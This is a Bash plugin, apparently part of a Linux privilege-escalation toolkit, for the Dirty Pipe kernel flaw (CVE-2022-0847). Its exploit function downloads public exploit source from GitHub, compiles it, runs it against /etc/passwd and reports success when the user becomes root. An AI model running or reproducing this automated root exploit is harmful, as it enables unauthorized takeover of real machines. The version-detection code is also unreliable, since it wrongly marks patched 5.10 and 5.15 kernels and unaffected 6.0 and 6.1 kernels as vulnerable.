#!/bin/bash
# Dirty Pipe (CVE-2022-0847) Plugin
PLUGIN_NAME="dirtypipe"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2022-0847"
PLUGIN_DESCRIPTION="Dirty Pipe - Pipe Buffer Overwrite"

dirtypipe_detect() {
    log_message "Checking for Dirty Pipe vulnerability..." "INFO"
    local major=$KERNEL_MAJOR
    local minor=$KERNEL_MINOR
    local patch=$KERNEL_PATCH
    
    if [ "$major" -eq 5 ]; then
        if [ "$minor" -ge 8 ]; then
            if [ "$minor" -lt 16 ] || ([ "$minor" -eq 16 ] && [ "$patch" -lt 11 ]) || \
               ([ "$minor" -eq 15 ] && [ "$patch" -lt 25 ]) || \
               ([ "$minor" -eq 10 ] && [ "$patch" -lt 102 ]); then
                log_message "System VULNERABLE to Dirty Pipe" "WARNING"
                return 0
            fi
        fi
    elif [ "$major" -eq 6 ] && [ "$minor" -lt 2 ]; then
        log_message "System VULNERABLE to Dirty Pipe" "WARNING"
        return 0
    fi
    
    log_message "System NOT vulnerable to Dirty Pipe" "INFO"
    return 1
}

dirtypipe_exploit() {
    log_message "Attempting Dirty Pipe exploitation..." "INFO"
    
    if ! dirtypipe_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/dirtypipe.c"
    local exploit_binary="${EXPLOIT_DIR}/dirtypipe"
    local exploit_url="${EXPLOIT_SOURCES[dirtypipe]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c"
    
    if ! download_exploit "dirtypipe" "$exploit_url" "$exploit_source"; then
        log_message "Failed to download Dirty Pipe exploit" "WARNING"
        return 1
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile Dirty Pipe exploit" "WARNING"
        return 1
    fi
    
    if [ $SAFE_MODE -eq 1 ]; then
        cp /etc/passwd "${BACKUP_DIR}/passwd.dirtypipe.bak" 2>/dev/null || true
    fi
    
    log_message "Running Dirty Pipe exploit..." "INFO"
    timeout_exec $TIMEOUT_CRITICAL "$exploit_binary" /etc/passwd 2>/dev/null &
    spinner $!
    wait $! 2>/dev/null
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "Dirty Pipe exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "Dirty Pipe exploit failed" "WARNING"
    return 1
}

dirtypipe_info() {
    cat << 'EOFINFO'
Dirty Pipe (CVE-2022-0847)
==========================
A vulnerability in the Linux kernel's pipe handling that allows
unprivileged users to overwrite data in read-only files.

Affected: Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102
Impact: Local privilege escalation to root
Discovery: Max Kellermann (IONOS)
EOFINFO
}
